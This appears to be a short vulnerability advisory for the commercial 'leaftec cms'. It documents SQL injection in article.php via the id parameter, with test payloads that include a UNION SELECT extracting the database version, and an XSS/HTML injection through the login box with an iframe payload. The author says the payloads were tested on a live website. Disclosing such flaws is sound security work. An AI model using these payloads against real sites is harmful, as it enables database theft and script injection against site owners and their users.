:: Vulnerabilities

#1 SQL Injection
Sadly the CMS is not available for free download but some German companies are using it.
leaftec cms contains a blog feature which displays written content, file: article.php.

Vulnerable URL:
http://www.some-cool-domain.tld/article.php?id=XX

Examples for testing and injecting SQL stuff:
http://www.some-cool-domain.tld/article.php?id='
http://www.some-cool-domain.tld/article.php?id="
http://www.some-cool-domain.tld/article.php?id=XX+AND+1=2+UNION+SELECT+1,2,3,4,5,concat(version()),7--
(Tested on a live website using leaftec cms.)
--------------------------------------------------------------------------------------------------------


#2 XSS / HTML Code Injection
Several parts of the CMS allow HTML and Java Script code injection, e.g. the login box.
After submitting the form the cms puts a red border around the login and password field but
also implements the injected code into the website.

Example for HTML code:
"><iframe src=http://www.google.de></iframe>
